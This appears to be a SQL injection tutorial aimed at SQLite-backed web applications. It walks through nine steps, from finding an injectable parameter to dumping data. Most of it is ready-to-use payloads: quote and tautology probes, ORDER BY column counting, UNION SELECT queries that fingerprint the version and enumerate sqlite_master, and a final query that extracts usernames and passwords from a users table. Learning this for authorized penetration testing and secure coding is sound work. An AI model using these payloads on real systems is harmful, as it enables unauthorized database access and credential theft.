# SQLite Database

## Introduction

SQLite is a lightweight, serverless Relational Database Management System (RDBMS).

Unlike MySQL, PostgreSQL, Oracle, or Microsoft SQL Server, SQLite stores the entire database in a single file and does not require a separate database server.

SQLite is commonly used in mobile applications, desktop software, browsers, and embedded systems.

SQLite has its own SQL syntax and metadata tables. Therefore, SQL Injection payloads used for SQLite are different from those used for other databases.

---

# SQLite SQL Injection Methodology

When testing a SQLite-based application, follow this process.

```
Identify Injection Point
        │
        ▼
Confirm SQL Injection
        │
        ▼
Determine Number of Columns
        │
        ▼
Find Text Column
        │
        ▼
Confirm SQLite Database
        │
        ▼
Retrieve SQLite Version
        │
        ▼
Enumerate Tables
        │
        ▼
Enumerate Columns
        │
        ▼
Extract Data
```

---

# Step 1 - Identify the Injection Point

Find user-controlled input such as:

- URL Parameters
- Search Box
- Login Form
- POST Parameters
- Cookies

Example:

```
https://example.com/filter?category=Accessories
```

Injection Point:

```
category
```

---

# Step 2 - Confirm SQL Injection

Test with:

```sql
'
```

If the application returns an SQL error, the parameter may be vulnerable.

Next test:

```sql
'--
```

If the page loads normally, SQL comments are working.

Next test:

```sql
' OR 1=1--
```

If more data is displayed, SQL Injection is confirmed.

---

# Step 3 - Determine the Number of Columns

Use the `ORDER BY` technique.

```sql
' ORDER BY 1--
```

```sql
' ORDER BY 2--
```

```sql
' ORDER BY 3--
```

Increase the number until an error occurs.

The previous successful number is the total number of columns.

---

# Step 4 - Find the Text Column

Use `UNION SELECT`.

Example:

```sql
' UNION SELECT NULL,NULL--
```

Replace each `NULL` with text.

Example:

```sql
' UNION SELECT 'TEST',NULL--
```

or

```sql
' UNION SELECT NULL,'TEST'--
```

The column displaying **TEST** is the text column.

---

# Step 5 - Confirm SQLite Database

Retrieve the SQLite version.

```sql
' UNION SELECT NULL,sqlite_version()--
```

If the application displays a SQLite version string, the backend database is SQLite.

---

# Step 6 - Retrieve SQLite Version

```sql
' UNION SELECT NULL,sqlite_version()--
```

Example Output

```
3.46.0
```

---

# Step 7 - Enumerate Tables

SQLite stores table information inside:

```
sqlite_master
```

Example:

```sql
' UNION SELECT NULL,name
FROM sqlite_master
WHERE type='table'--
```

---

# Step 8 - Enumerate Columns

SQLite stores the table definition inside:

```
sqlite_master
```

Example:

```sql
' UNION SELECT NULL,sql
FROM sqlite_master
WHERE type='table'
AND name='users'--
```

The output contains the CREATE TABLE statement, which reveals the column names.

---

# Step 9 - Extract Data

After identifying the required table and columns:

```sql
' UNION SELECT username,password
FROM users--
```

---

# SQLite Metadata

| Table | Purpose |
|-------|---------|
| sqlite_master | Stores tables, indexes, views, and table definitions |
| sqlite_version() | Returns the SQLite version |

---

# Summary

1. Identify the injection point.
2. Confirm SQL Injection.
3. Find the number of columns.
4. Find the text column.
5. Confirm SQLite database.
6. Retrieve SQLite version.
7. Enumerate tables.
8. Enumerate columns.
9. Extract data.
